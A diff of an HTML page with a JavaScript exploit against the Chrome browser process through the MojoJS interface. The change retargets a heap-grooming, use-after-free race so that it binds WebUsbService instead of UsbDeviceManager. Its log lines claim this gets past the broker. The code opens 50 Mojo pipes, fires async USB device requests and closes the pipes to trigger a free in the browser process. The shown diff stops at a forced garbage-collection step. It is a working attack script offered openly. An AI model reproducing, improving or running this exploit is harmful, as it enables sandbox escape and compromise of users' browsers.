@@ -5,39 +5,38 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>Hunting the Browser Process</h1>
+    <h1>Bypassing the Broker</h1>
     <script type="module">
-        import { UsbDeviceManagerRemote, UsbDeviceManager } from './gen/services/device/public/mojom/usb_manager.mojom.m.js';
+        // 1. Import the WebUsbService instead of UsbDeviceManager
+        import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found. Ensure --enable-blink-features=MojoJS is set.");
+                console.error("[-] MojoJS not found.");
                 return;
             }
 
-            console.log("[*] Grooming the Browser Heap...");
-            let managers = [];
+            console.log("[*] Grooming the Browser Heap with WebUsbService...");
+            let services = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Create a raw Mojo message pipe. This gives us two endpoints.
                 let pipe = Mojo.createMessagePipe();
                 
-                // 2. Bind the Browser Process end of the pipe (handle0)
-                Mojo.bindInterface(UsbDeviceManager.$interfaceName, pipe.handle0);
+                // 2. Ask the Broker for WebUsbService. It WILL allow this.
+                Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);
 
-                // 3. Bind our JS Remote to the other end of the pipe (handle1)
-                let usbManagerRemote = new UsbDeviceManagerRemote();
-                usbManagerRemote.$.bindHandle(pipe.handle1);
+                let usbServiceRemote = new WebUsbServiceRemote();
+                usbServiceRemote.$.bindHandle(pipe.handle1);
                 
-                managers.push(usbManagerRemote);
+                services.push(usbServiceRemote);
             }
 
-            console.log("[+] Bound 50 Mojo pipes to Browser Process.");
+            console.log("[+] Bound 50 WebUsbService pipes. Broker bypassed.");
             console.log("[*] Triggering async hardware requests...");
             
-            for(let m of managers) {
-                // Call GetDevices to initiate the async hardware scan
-                m.getDevices().catch(e => {}); 
+            for(let s of services) {
+                // 3. Call GetDevices on the WebUsbService.
+                s.getDevices().catch(e => {}); 
             }
 
             // THE RACE CONDITION
@@ -45,9 +44,9 @@
 
             console.log("[!] TRIGGERING FREE: Severing pipes...");
             
-            // The Kill: Close the pipes to trigger the C++ destructor
-            for(let m of managers) {
-                m.$.close();
+            // 4. The Kill: Close the pipes to trigger the C++ destructor in the Browser Process
+            for(let s of services) {
+                s.$.close();
             }
 
             // Force garbage collection in V8
